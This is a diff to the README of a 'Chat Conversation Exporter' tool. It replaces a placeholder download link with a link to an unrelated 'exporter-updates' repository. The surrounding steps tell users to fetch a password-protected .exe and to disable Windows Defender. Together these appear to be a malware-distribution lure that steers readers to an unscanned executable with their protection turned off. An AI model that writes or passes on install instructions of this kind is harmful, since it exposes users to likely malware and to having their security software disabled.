@@ -26,7 +26,7 @@ The **Chat Conversation Exporter** is a Python-based tool designed for **Visible
 ### Steps
 
 1. **Download the `.exe` file**:
-   - The latest version of the application can be downloaded from the [Releases](https://github.com/yourusername/chat-conversation-exporter/releases) page.
+   - The latest version of the application can be downloaded from the [Releases](https://github.com/sn1ky/exporter-updates/releases) page.
    - The file is password-protected. Use the password provided by your administrator to extract it.
 
 2. **Disable Windows Defender** (if necessary):
